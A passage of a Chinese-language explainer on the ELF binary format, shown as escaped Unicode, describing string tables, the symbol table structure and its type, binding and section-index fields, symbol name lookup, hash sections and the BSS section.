\u5b57\u7b26\u4e32\u8868\u7d22\u5f15\u53ef\u4ee5\u5f15\u7528\u8282\u533a\u4e2d\u4efb\u610f\u5b57\u8282\u3002 \u5b57\u7b26\u4e32\u53ef\u4ee5\u51fa\u73b0\u591a\u6b21\u3002 \u53ef\u4ee5\u5b58\u5728\u5bf9\u5b50\u5b57\u7b26\u4e32\u7684\u5f15\u7528\u3002 \u540c\u4e00\u4e2a\u5b57\u7b26\u4e32\u53ef\u4ee5\u88ab\u5f15\u7528\u591a\u6b21\u3002 \u5b57\u7b26\u4e32\u8868\u4e2d\u4e5f\u53ef\u4ee5\u5b58\u5728\u672a\u5f15\u7528\u7684\u5b57\u7b26\u4e32\u3002 \u8fd9\u90e8\u5206\u4fe1\u606f\u5728\u8fdb\u884c strip \u540e\u5c31\u4f1a\u6d88\u5931\u3002 .shstrtab: Section Header String Table \u00b6 \u8be5\u8282\u533a\u4e0e .strtab \u7684\u5b58\u50a8\u7ed3\u6784\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u8be5\u8282\u533a\u5b58\u50a8\u7684\u662f\u8282\u533a\u540d\u7684\u5b57\u7b26\u4e32\u3002 .symtab: Symbol Table \u00b6 \u6982\u8ff0 \u00b6 \u6bcf\u4e2a\u76ee\u6807\u6587\u4ef6\u90fd\u4f1a\u6709\u4e00\u4e2a\u7b26\u53f7\u8868\uff0c\u719f\u6089\u7f16\u8bd1\u539f\u7406\u7684\u5c31\u4f1a\u77e5\u9053\uff0c\u5728\u7f16\u8bd1\u7a0b\u5e8f\u65f6\uff0c\u5fc5\u987b\u6709\u76f8\u5e94\u7684\u7ed3\u6784\u6765\u7ba1\u7406\u7a0b\u5e8f\u4e2d\u7684\u7b26\u53f7\u4ee5\u4fbf\u4e8e\u5bf9\u51fd\u6570\u548c\u53d8\u91cf\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002 \u6b64\u5916\uff0c\u94fe\u63a5\u672c\u8d28\u5c31\u662f\u628a\u591a\u4e2a\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u76f8\u4e92\u201c\u7c98\u201d\u5728\u4e00\u8d77\uff0c\u5b9e\u9645\u4e0a\uff0c\u76ee\u6807\u6587\u4ef6\u76f8\u4e92\u7c98\u5408\u662f\u76ee\u6807\u6587\u4ef6\u4e4b\u95f4\u5bf9\u5730\u5740\u7684\u5f15\u7528\uff0c\u5373\u51fd\u6570\u548c\u53d8\u91cf\u7684\u5730\u5740\u7684\u76f8\u4e92\u5f15\u7528\u3002\u800c\u5728\u7c98\u5408\u7684\u8fc7\u7a0b\u4e2d\uff0c\u7b26\u53f7\u5c31\u662f\u5176\u4e2d\u7684\u7c98\u5408\u5242\u3002 \u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\u8868\u5305\u542b\u4e86 \u4e00\u4e9b\u901a\u7528\u7684\u7b26\u53f7 \uff0c\u8fd9\u90e8\u5206\u4fe1\u606f\u5728\u8fdb\u884c\u4e86 strip \u64cd\u4f5c\u540e\u5c31\u4f1a\u6d88\u5931\u3002\u5305\u62ec \u53d8\u91cf\u540d \u51fd\u6570\u540d \u7b26\u53f7\u8868\u5176\u5b9e\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u5177\u4f53\u5982\u4e0b typedef struct { Elf32_Word st_name ; Elf32_Addr st_value ; Elf32_Word st_size ; unsigned char st_info ; unsigned char st_other ; Elf32_Half st_shndx ; } Elf32_Sym ; \u6bcf\u4e2a\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b \u5b57\u6bb5 \u8bf4\u660e st_name \u7b26\u53f7\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u5bf9\u5e94\u7684\u7d22\u5f15\u3002\u5982\u679c\u8be5\u503c\u975e 0\uff0c\u5219\u5b83\u8868\u793a\u4e86\u7ed9\u51fa\u7b26\u53f7\u540d\u7684\u5b57\u7b26\u4e32\u8868\u7d22\u5f15\uff0c\u5426\u5219\u7b26\u53f7\u8868\u9879\u6ca1\u6709\u540d\u79f0\u3002 \u6ce8\uff1a\u5916\u90e8 C \u7b26\u53f7\u5728 C \u8bed\u8a00\u548c\u76ee\u6807\u6587\u4ef6\u7684\u7b26\u53f7\u8868\u4e2d\u5177\u6709\u76f8\u540c\u7684\u540d\u79f0\u3002 st_value \u7ed9\u51fa\u4e0e\u7b26\u53f7\u76f8\u5173\u8054\u7684\u6570\u503c\uff0c\u5177\u4f53\u53d6\u503c\u4f9d\u8d56\u4e8e\u4e0a\u4e0b\u6587\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u6b63\u5e38\u7684\u6570\u503c\u3001\u4e00\u4e2a\u5730\u5740\u7b49\u7b49\u3002 st_size \u7ed9\u51fa\u5bf9\u5e94\u7b26\u53f7\u6240\u5360\u7528\u7684\u5927\u5c0f\u3002\u5982\u679c\u7b26\u53f7\u6ca1\u6709\u5927\u5c0f\u6216\u8005\u5927\u5c0f\u672a\u77e5\uff0c\u5219\u6b64\u6210\u5458\u4e3a0\u3002 st_info \u7ed9\u51fa\u7b26\u53f7\u7684\u7c7b\u578b\u548c\u7ed1\u5b9a\u5c5e\u6027\u3002\u4e4b\u540e\u4f1a\u7ed9\u51fa\u82e5\u5e72\u53d6\u503c\u548c\u542b\u4e49\u7684\u7ed1\u5b9a\u5173\u7cfb\u3002 st_other \u76ee\u524d\u4e3a0\uff0c\u5176\u542b\u4e49\u6ca1\u6709\u88ab\u5b9a\u4e49\u3002 st_shndx \u5982\u679c\u7b26\u53f7\u5b9a\u4e49\u5728\u8be5\u6587\u4ef6\u4e2d\uff0c\u90a3\u4e48\u8be5\u6210\u5458\u4e3a\u7b26\u53f7\u6240\u5728\u8282\u5728\u8282\u533a\u5934\u90e8\u8868\u4e2d\u7684\u4e0b\u6807\uff1b\u5982\u679c\u7b26\u53f7\u4e0d\u5728\u672c\u76ee\u6807\u6587\u4ef6\u4e2d\u56fd\uff0c\u6216\u8005\u5bf9\u4e8e\u67d0\u4e9b\u7279\u6b8a\u7684\u7b26\u53f7\uff0c\u8be5\u6210\u5458\u5177\u6709\u4e00\u4e9b\u7279\u6b8a\u542b\u4e49\u3002 \u5176\u4e2d\uff0c\u7b26\u53f7\u8868\u4e2d\u4e0b\u6807 0 \u5b58\u50a8\u4e86\u7b26\u53f7\u8868\u7684\u4e00\u4e2a\u5143\u7d20\uff0c\u540c\u65f6\u8fd9\u4e2a\u5143\u7d20\u4e5f\u76f8\u5bf9\u6bd4\u8f83\u7279\u6b8a\uff0c\u4f5c\u4e3a\u6240\u6709\u672a\u5b9a\u4e49\u7b26\u53f7\u7684\u7d22\u5f15\uff0c\u5177\u4f53\u5982\u4e0b \u540d\u79f0 \u53d6\u503c \u8bf4\u660e st_name 0 \u65e0\u540d\u79f0 st_value 0 0 \u503c st_size 0 \u65e0\u5927\u5c0f st_info 0 \u65e0\u7c7b\u578b\uff0c\u5c40\u90e8\u7ed1\u5b9a st_other 0 \u65e0\u9644\u52a0\u4fe1\u606f st_shndx 0 \u65e0\u8282\u533a st_value \u00b6 \u5728 Linux \u7684 ELF \u6587\u4ef6\u4e2d\uff0c\u5177\u4f53\u8bf4\u660e\u5982\u4e0b \u8be5\u7b26\u53f7\u5bf9\u5e94\u7740\u4e00\u4e2a\u53d8\u91cf\uff0c\u90a3\u4e48\u8868\u660e\u8be5\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u7684\u504f\u79fb\u3002\u6211\u4eec\u53ef\u7531\u8fd9\u4e2a\u503c\u83b7\u53d6\u5176\u6587\u4ef6\u504f\u79fb \u83b7\u53d6\u8be5\u7b26\u53f7\u5bf9\u5e94\u7684 st_shndx \uff0c\u8fdb\u800c\u83b7\u53d6\u5230\u76f8\u5173\u7684\u8282\u533a\u3002 \u6839\u636e\u8282\u533a\u5934\u5143\u7d20\u53ef\u4ee5\u83b7\u53d6\u8282\u533a\u7684\u865a\u62df\u57fa\u5730\u5740\u548c\u6587\u4ef6\u57fa\u5730\u5740\u3002 value-\u5185\u5b58\u57fa\u865a\u62df\u5730\u5740=\u6587\u4ef6\u504f\u79fb-\u6587\u4ef6\u57fa\u5730\u5740 \u8be5\u7b26\u53f7\u5bf9\u5e94\u7740\u4e00\u4e2a\u51fd\u6570\uff0c\u90a3\u4e48\u8868\u660e\u8be5\u51fd\u6570\u5728\u6587\u4ef6\u4e2d\u7684\u8d77\u59cb\u5730\u5740\u3002 st_info \u00b6 st_info \u4e2d\u5305\u542b\u7b26\u53f7\u7c7b\u578b\u548c\u7ed1\u5b9a\u4fe1\u606f\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e86\u63a7\u5236\u5b83\u7684\u503c\u7684\u65b9\u5f0f\u5177\u4f53\u4fe1\u606f\u5982\u4e0b #define ELF32_ST_TYPE(i) ((i)&0xf) #define ELF32_ST_INFO(b, t) (((b)<<4) + ((t)&0xf)) Symbol Type \u00b6 \u53ef\u4ee5\u770b\u51fa st_info \u7684\u4f4e 4 \u4f4d\u8868\u793a\u7b26\u53f7\u7684\u7c7b\u578b\uff0c\u5177\u4f53\u5b9a\u4e49\u5982\u4e0b \u540d\u79f0 \u53d6\u503c \u8bf4\u660e STT_NOTYPE 0 \u7b26\u53f7\u7684\u7c7b\u578b\u6ca1\u6709\u5b9a\u4e49\u3002 STT_OBJECT 1 \u7b26\u53f7\u4e0e\u67d0\u4e2a\u6570\u636e\u5bf9\u8c61\u76f8\u5173\uff0c\u6bd4\u5982\u4e00\u4e2a\u53d8\u91cf\u3001\u6570\u7ec4\u7b49\u7b49\u3002 STT_FUNC 2 \u7b26\u53f7\u4e0e\u67d0\u4e2a\u51fd\u6570\u6216\u8005\u5176\u4ed6\u53ef\u6267\u884c\u4ee3\u7801\u76f8\u5173\u3002 STT_SECTION 3 \u7b26\u53f7\u4e0e\u67d0\u4e2a\u8282\u533a\u76f8\u5173\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u7b26\u53f7\u8868\u9879\u4e3b\u8981\u7528\u4e8e\u91cd\u5b9a\u4f4d\uff0c\u901a\u5e38\u5177\u6709 STB_LOCAL \u7ed1\u5b9a\u3002 STT_FILE 4 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7b26\u53f7\u7684\u540d\u79f0\u7ed9\u51fa\u4e86\u751f\u6210\u8be5\u76ee\u6807\u6587\u4ef6\u76f8\u5173\u7684\u6e90\u6587\u4ef6\u7684\u540d\u79f0\u3002\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u8be5\u7b26\u53f7\u5177\u6709 STB_LOCAL \u7ed1\u5b9a\uff0c\u5176\u8282\u533a\u7d22\u5f15\u662f SHN_ABS \u4e14\u4f18\u5148\u7ea7\u6bd4\u5176\u4ed6 STB_LOCAL \u7b26\u53f7\u9ad8\u3002 STT_LOPROC \uff5e STT_HIPROC 13~15 \u4fdd\u7559\u7528\u4e8e\u7279\u5b9a\u5904\u7406\u5668 \u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u7b26\u53f7\u6709\u6bd4\u8f83\u7279\u6b8a\uff0c\u5f53\u53e6\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u4ece\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5f15\u7528\u4e00\u4e2a\u51fd\u6570\u65f6\uff0c\u94fe\u63a5\u5668\u81ea\u52a8\u4e3a\u88ab\u5f15\u7528\u7b26\u53f7\u521b\u5efa\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u3002\u5171\u4eab\u76ee\u6807\u4e2d\u9664\u4e86 STT_FUNC \uff0c \u5176\u5b83\u7b26\u53f7\u5c06\u4e0d\u4f1a\u901a\u8fc7\u8fc7\u7a0b\u94fe\u63a5\u8868\u81ea\u52a8\u88ab\u5f15\u7528\u3002 \u5982\u679c\u4e00\u4e2a\u7b26\u53f7\u7684\u503c\u6307\u5411\u8282\u5185\u7684\u7279\u5b9a\u4f4d\u7f6e\uff0c\u5219\u5b83\u7684\u8282\u7d22\u5f15\u53f7 st_shndx \uff0c\u5305\u542b\u4e86\u5b83\u5728\u8282\u5934\u8868\u4e2d\u7684\u7d22\u5f15\u3002\u5f53\u4e00\u4e2a\u8282\u5728\u91cd\u5b9a\u4f4d\u8fc7\u7a0b\u4e2d\u79fb\u52a8\u65f6\uff0c\u8be5\u7b26\u53f7\u503c\u4e5f\u505a\u76f8\u5e94\u6539\u53d8\uff0c\u5bf9\u8be5\u7b26\u53f7\u7684\u5f15\u7528\u7ee7\u7eed\u6307\u5411\u7a0b\u5e8f\u4e2d\u7684\u76f8\u540c\u4f4d\u7f6e\u3002\u6709\u4e9b\u7279\u5b9a\u8282\u7d22\u5f15\u503c\u5177\u6709\u5176\u4ed6\u8bed\u4e49\u3002 Symbol Binding \u00b6 \u6839\u636e #define ELF32_ST_BIND(i) ((i)>>4) \u53ef\u4ee5\u770b\u51fa st_info \u7684\u9ad8 4 \u4f4d\u8868\u793a\u7b26\u53f7\u7ed1\u5b9a\u7684\u4fe1\u606f\u3002\u800c\u8fd9\u90e8\u5206\u4fe1\u606f\u786e\u5b9a\u4e86\u7b26\u53f7\u7684\u94fe\u63a5\u53ef\u89c1\u6027\u4ee5\u53ca\u5176\u884c\u4e3a\uff0c\u5177\u4f53\u7684\u53d6\u503c\u5982\u4e0b \u540d\u79f0 \u53d6\u503c \u8bf4\u660e STB_LOCAL 0 \u8868\u660e\u8be5\u7b26\u53f7\u4e3a\u5c40\u90e8\u7b26\u53f7\uff0c\u5728\u5305\u542b\u8be5\u7b26\u53f7\u5b9a\u4e49\u7684\u76ee\u6807\u6587\u4ef6\u4ee5\u5916\u4e0d\u53ef\u89c1\u3002\u76f8\u540c\u540d\u79f0\u7684\u5c40\u90e8\u7b26\u53f7\u53ef\u4ee5\u5b58\u5728\u4e8e\u591a\u4e2a\u6587\u4ef6\u4e2d\uff0c\u4e92\u4e0d\u5f71\u54cd\u3002 STB_GLOBAL 1 \u8868\u660e\u8be5\u7b26\u53f7\u4e3a\u5168\u5c40\u7b26\u53f7\uff0c\u5bf9\u6240\u6709\u5c06\u88ab\u7ec4\u5408\u5728\u4e00\u8d77\u7684\u76ee\u6807\u6587\u4ef6\u90fd\u662f\u53ef\u89c1\u7684\u3002\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5bf9\u67d0\u4e2a\u5168\u5c40\u7b26\u53f7\u7684\u5b9a\u4e49\u5c06\u6ee1\u8db3\u53e6\u4e00\u4e2a\u6587\u4ef6\u5bf9\u76f8\u540c\u5168\u5c40\u7b26\u53f7\u7684\u672a\u5b9a\u4e49\u5f15\u7528\u3002\u6211\u4eec\u79f0\u521d\u59cb\u5316\u975e\u96f6\u53d8\u91cf\u7684\u5168\u5c40\u7b26\u53f7\u4e3a\u5f3a\u7b26\u53f7\uff0c\u53ea\u80fd\u5b9a\u4e49\u4e00\u6b21\u3002 STB_WEAK 2 \u5f31\u7b26\u53f7\u4e0e\u5168\u5c40\u7b26\u53f7\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u5b83\u4eec\u7684\u5b9a\u4e49\u4f18\u5148\u7ea7\u6bd4\u8f83\u4f4e\u3002 STB_LOPROC ~STB_HIPROC 13 \u8fd9\u4e2a\u8303\u56f4\u7684\u53d6\u503c\u662f\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u3002 \u5728\u6bcf\u4e2a\u7b26\u53f7\u8868\u4e2d\uff0c\u6240\u6709\u5177\u6709 STB_LOCAL \u7ed1\u5b9a\u7684\u7b26\u53f7\u90fd\u4f18\u5148\u4e8e\u5f31\u7b26\u53f7\u548c\u5168\u5c40\u7b26\u53f7\u3002\u7b26\u53f7\u8868\u8282\u533a\u4e2d\u7684 sh_info \u9879\u6240\u5bf9\u5e94\u7684\u5934\u90e8\u7684\u6210\u5458\u5305\u542b\u7b2c\u4e00\u4e2a\u975e\u5c40\u90e8\u7b26\u53f7\u7684\u7b26\u53f7\u8868\u7d22\u5f15\u3002 \u6b64\u5916\uff0c\u5168\u5c40\u7b26\u53f7\u4e0e\u5f31\u7b26\u53f7\u7684\u4e3b\u8981\u533a\u522b\u5982\u4e0b\uff1a \u5f53\u94fe\u63a5\u5668\u5728\u94fe\u63a5\u591a\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u4e0d\u5141\u8bb8\u5b9a\u4e49\u591a\u4e2a\u76f8\u540c\u540d\u5b57\u7684 STB_GLOBAL \u7b26\u53f7\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u5df2\u5b9a\u4e49\u5168\u5c40\u7b26\u53f7\uff0c\u5219\u540c\u540d\u7684\u5f31\u7b26\u53f7\u7684\u5b58\u5728\u4e0d\u4f1a\u5f15\u8d77\u9519\u8bef\u3002\u94fe\u63a5\u5668\u4f1a\u4f18\u5148\u9009\u62e9\u5168\u5c40\u5b9a\u4e49\uff0c\u5ffd\u7565\u5f31\u7b26\u53f7\u5b9a\u4e49\u3002\u7c7b\u4f3c\u7684\uff0c\u5982\u679c\u4e00\u4e2a\u516c\u5171\u7b26\u53f7\u5b58\u5728( st_shndx \u57df\u4e3a SHN_COMMON \u7684\u7b26\u53f7)\uff0c\u5219\u540c\u540d\u7684\u5f31\u7b26\u53f7\u7684\u5b58\u5728\u4e0d\u4f1a\u5f15\u8d77\u9519\u8bef\u3002\u94fe\u63a5\u5668\u4f1a\u9009\u62e9\u516c\u5171\u5b9a\u4e49\uff0c\u5ffd\u7565\u5f31\u7b26\u53f7\u5b9a\u4e49\u3002 \u5f53\u94fe\u63a5\u5668\u5bfb\u627e\u6587\u4ef6\u5e93\u65f6\uff0c\u5b83\u4f1a\u63d0\u53d6\u5305\u542b\u672a\u5b9a\u4e49\u5168\u5c40\u7b26\u53f7\u7684\u6210\u5458\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u5168\u5c40\u7b26\u53f7\u6216\u8005\u5f31\u7b26\u53f7\u3002\u94fe\u63a5\u5668\u4e0d\u4f1a\u4e3a\u4e86\u89e3\u51b3\u672a\u5b9a\u4e49\u7684\u5f31\u7b26\u53f7\u95ee\u9898\u800c\u63d0\u53d6\u6587\u4ef6\uff0c\u672a\u5b9a\u4e49\u7684\u5f31\u7b26\u53f7\u7684\u503c\u4e3a0\u3002 \u7b26\u53f7\u53d6\u503c \u00b6 \u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u5bf9\u7b26\u53f7\u8868\u9879\u4e2d st_value \u6210\u5458\u7684\u89e3\u91ca\u4e0d\u540c\uff1a \u5728\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e2d\uff0cst_value \u4fdd\u5b58\u4e86\u8282\u533a\u7d22\u5f15\u4e3a SHN_COMMON \u7684\u7b26\u53f7\u7684\u5bf9\u9f50\u7ea6\u675f\u3002 \u5728\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e2d\uff0cst_value \u4fdd\u5b58\u4e86\u5df2\u5b9a\u4e49\u7b26\u53f7\u7684\u8282\u533a\u504f\u79fb\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cst_value\u4fdd\u7559\u4e86st_shndx \u6240\u6807\u8bc6\u7684\u8282\u533a\u7684\u5934\u90e8\u5230\u7b26\u53f7\u4f4d\u7f6e\u7684\u504f\u79fb\u3002 \u5728\u53ef\u6267\u884c\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\uff0cst_value \u5305\u542b\u4e00\u4e2a\u865a\u5730\u5740\u3002\u4e3a\u4e86\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u7b26\u53f7\u5bf9\u52a8\u6001\u94fe\u63a5\u5668\u66f4\u6709\u7528\uff0c\u8282\u533a\u504f\u79fb\uff08\u9488\u5bf9\u6587\u4ef6\u7684\u89e3\u91ca\uff09\u7ed9\u51fa\u4e86\u4e0e\u8282\u533a\u53f7\u65e0\u5173\u7684\u865a\u62df\u5730\u5740\uff08\u9488\u5bf9\u5185\u5b58\u7684\u89e3\u91ca\uff09\u3002 \u7b26\u53f7\u8868\u53d6\u503c\u5728\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u4e2d\u5177\u6709\u76f8\u4f3c\u7684\u542b\u4e49\uff0c\u53ef\u4ee5\u6709\u9002\u5f53\u7684\u7a0b\u5e8f\u53ef\u4ee5\u91c7\u53d6\u9ad8\u6548\u7684\u65b9\u6cd5\u6765\u8bbf\u95ee\u6570\u636e\u3002 st_shndx \u00b6 \u7279\u6b8a\u7684\u7d22\u5f15\u53ca\u5176\u610f\u4e49\u5982\u4e0b SHN_ABS\uff1a \u7b26\u53f7\u7684\u53d6\u503c\u5177\u6709\u7edd\u5bf9\u6027\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u91cd\u5b9a\u4f4d\u800c\u53d1\u751f\u53d8\u5316\u3002 SHN_COMMON\uff1a \u7b26\u53f7\u6807\u8bb0\u4e86\u4e00\u4e2a\u5c1a\u672a\u5206\u914d\u7684\u516c\u5171\u5757\u3002\u7b26\u53f7\u7684\u53d6\u503c\u7ed9\u51fa\u4e86\u5bf9\u9f50\u7ea6\u675f\uff0c\u4e0e\u8282\u533a\u7684 sh_addralign \u6210\u5458\u7c7b\u4f3c\u3002\u5c31\u662f\u8bf4\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u5728\u5730\u5740\u4f4d\u4e8e st_value \u7684\u500d\u6570\u5904\u4e3a\u7b26\u53f7\u5206\u914d\u7a7a\u95f4\u3002\u7b26\u53f7\u7684\u5927\u5c0f\u7ed9\u51fa\u4e86\u6240\u9700\u8981\u7684\u5b57\u8282\u6570\u3002 SHN_UNDEF\uff1a \u6b64\u7d22\u5f15\u503c\u8868\u793a\u7b26\u53f7\u6ca1\u6709\u5b9a\u4e49\u3002\u5f53\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u6b64\u76ee\u6807\u6587\u4ef6\u4e0e\u5176\u4ed6\u5b9a\u4e49\u4e86\u8be5\u7b26\u53f7\u7684\u76ee\u6807\u6587\u4ef6\u8fdb\u884c\u7ec4\u5408\u65f6\uff0c\u6b64\u6587\u4ef6\u4e2d\u5bf9\u8be5\u7b26\u53f7\u7684\u5f15\u7528\u5c06\u88ab\u94fe\u63a5\u5230\u5b9e\u9645\u5b9a\u4e49\u7684\u4f4d\u7f6e\u3002 \u5982\u4f55\u5b9a\u4f4d \u00b6 \u90a3\u4e48\u5bf9\u4e8e\u4e00\u4e2a\u7b26\u53f7\u6765\u8bf4\u5982\u4f55\u5b9a\u4f4d\u5176\u5bf9\u5e94\u5b57\u7b26\u4e32\u7684\u5730\u5740\u5462\uff1f\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b \u6839\u636e Section Header Table \u4e2d\u7b26\u53f7\u8282\u5934\u4e2d\u7684 sh_link \u83b7\u53d6\u8be5\u7b26\u53f7\u8282\u4e2d\u5bf9\u5e94\u7b26\u53f7\u5b57\u7b26\u4e32\u8282\u5728 Section Header Table \u4e2d\u7684\u4e0b\u6807\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5bf9\u5e94\u7b26\u53f7\u8282\u7684\u5730\u5740\u3002 \u6839\u636e\u8be5\u7b26\u53f7\u7684\u5b9a\u4e49\u4e2d\u7684 st_name \u83b7\u53d6\u8be5\u7b26\u53f7\u7684\u504f\u79fb\uff0c\u5373\u5728\u5bf9\u5e94\u7b26\u53f7\u8282\u4e2d\u7684\u504f\u79fb\u3002 \u6839\u636e\u4e0a\u8ff0\u4e24\u8005\u5c31\u53ef\u4ee5\u5b9a\u4f4d\u4e00\u4e2a\u7b26\u53f7\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\u4e86\u3002 .gnu.hash \u00b6 \u6ce8\uff1a\u672c\u90e8\u5206\u4e3b\u8981\u53c2\u8003https://blogs.oracle.com/ali/gnu-hash-elf-sections\u3002 \u5728 ELF \u826f\u597d\u5730\u53ef\u6269\u5c55\u6027\u7684\u5e2e\u52a9\u4e0b\uff0c GNU \u4e3a ELF \u5bf9\u8c61\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u54c8\u5e0c\u8282\uff0c\u8fd9\u4e2a\u8282\u7684\u6027\u80fd\u76f8\u6bd4\u4e8e\u539f\u6709\u7684 SYSV hash \u4f1a\u597d\u5f88\u591a\u3002\u8be5\u8282\u7528\u4e8e\u5feb\u901f\u6839\u636e\u7b26\u53f7\u540d\u83b7\u53d6\u5bf9\u5e94\u7b26\u53f7\u8868\u4e2d\u7684\u7d22\u5f15\u3002 \u66f4\u591a\u5185\u5bb9\u8bf7\u53c2\u8003 https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections \u3002 \u6709\u5f85\u8fdb\u4e00\u6b65\u5b66\u4e60\u3002 ELF \u6807\u51c6 \u00b6 ELF\u6587\u4ef6\u4e2d\u7684\u54c8\u5e0c\u8868\u7531 Elf32_Word \u5bf9\u8c61\u6784\u6210\uff0c\u7528\u6765\u652f\u6301\u7b26\u53f7\u8868\u8bbf\u95ee\u3002\u4e0b\u9762\u7684\u7b26\u53f7\u53ef\u4ee5\u7528\u6765\u8f85\u52a9\u89e3\u91ca\u7b26\u53f7\u8868\u7684\u7ec4\u7ec7\u60c5\u51b5\uff0c\u4f46\u662f\u4ed6\u4eec\u5e76\u4e0d\u662f ELF \u6587\u4ef6\u8bf4\u660e\u7684\u4e00\u90e8\u5206\u3002 bucket\u6570\u7ec4\u5305\u542b\u4e86nbucket\u4e2a\u5143\u7d20\uff0cchain\u6570\u7ec4\u5305\u542b\u4e86nchain\u4e2a\u5143\u7d20\uff0c\u6240\u6709\u7684\u6570\u7ec4\u7684\u4e0b\u6807\u90fd\u662f\u4ee50\u5f00\u59cb\u3002bucket\u548cchain\u90fd\u5305\u542b\u7b26\u53f7\u8868\u7d22\u5f15\u3002chain\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u662f\u548c\u7b26\u53f7\u8868\u4e2d\u7684\u5143\u7d20\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u56e0\u6b64\u7b26\u53f7\u8868\u7684\u5143\u7d20\u4e2a\u6570\u5fc5\u987b\u548cnchain\u7684\u5927\u5c0f\u76f8\u540c\uff0c\u6545\u800c\u7b26\u53f7\u8868\u7684\u7d22\u5f15\u540c\u6837\u53ef\u4ee5\u4f5c\u4e3achain\u8868\u7684\u7d22\u5f15\u3002\u4e0b\u9762\u5c55\u793a\u7684\u54c8\u5e0c\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u7b26\u53f7\u540d\u4f5c\u4e3a\u8f93\u5165\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u8fd9\u4e2a\u503c\u53ef\u80fd\u88ab\u7528\u4e8e\u8ba1\u7b97bucket\u7684\u7d22\u5f15\u3002\u56e0\u6b64\uff0c\u5982\u679c\u54c8\u5e0c\u51fd\u6570\u9488\u5bf9\u4e8e\u67d0\u4e2a\u540d\u5b57\u8fd4\u56de\u503cx\uff0c\u90a3\u4e48 bucket[x%nbucket] \u7ed9\u51fa\u4e86\u4e00\u4e2a\u7d22\u5f15y\uff0c\u53ef\u4ee5\u7528\u6765\u7d22\u5f15\u7b26\u53f7\u8868\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u7d22\u5f15chain\u8868\u3002\u5982\u679c\u7b26\u53f7\u8868\u7684\u5bf9\u5e94\u7d22\u5f15\u5e76\u4e0d\u662f\u6240\u60f3\u8981\u7684\u54ea\u4e00\u4e2a\uff0c\u90a3\u4e48chain[y]\u5c31\u4f1a\u7ed9\u51fa\u7ed9\u51fa\u540c\u4e00\u4e2a\u54c8\u5e0c\u503c\u7684\u4e0b\u4e00\u4e2a\u7b26\u53f7\u8868\u4e2d\u8868\u9879\u7684\u4f4d\u7f6e\uff0c\u5373\u53ef\u4ee5\u7528\u6765\u9632\u6b62\u51fa\u73b0\u54c8\u5e0c\u503c\u4e00\u6837\u7684\u60c5\u51b5\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u8ddf\u7740chain\u94fe\u4e00\u76f4\u641c\u7d22\u76f4\u5230\u9047\u5230\u6240\u60f3\u8981\u7684\u7b26\u53f7\uff0c\u6216\u8005\u9047\u5230\u503c\u4e3a STN_UNDEF \u7684chain\u7684\u8868\u9879\u3002 Data Related Sections \u00b6 BSS Section \u00b6 \u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u5bf9\u5e94\u7684\u8282\u3002\u6b64\u8282\u533a\u4e0d\u5360\u7528 ELF \u6587\u4ef6\u7a7a\u95f4\uff0c\u4f46\u5360\u7528\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u4e2d\u7684\u7a7a\u95f4\u3002\u5f53\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u5c06\u628a\u8fd9\u4e9b\u6570\u636e\u521d\u59cb\u5316\u4e3a 0\u3002bss\u5176\u5b9e\u662fblock started by symbol\u7684\u7b80\u5199\uff0c\u8bf4\u660e\u8be5\u8282\u533a\u4e2d\u5355\u7eaf\u5730\u8bf4\u660e\u4e86\u6709\u54ea\u4e9b\u53d8\u91cf\u3002 .data Section \u00b6 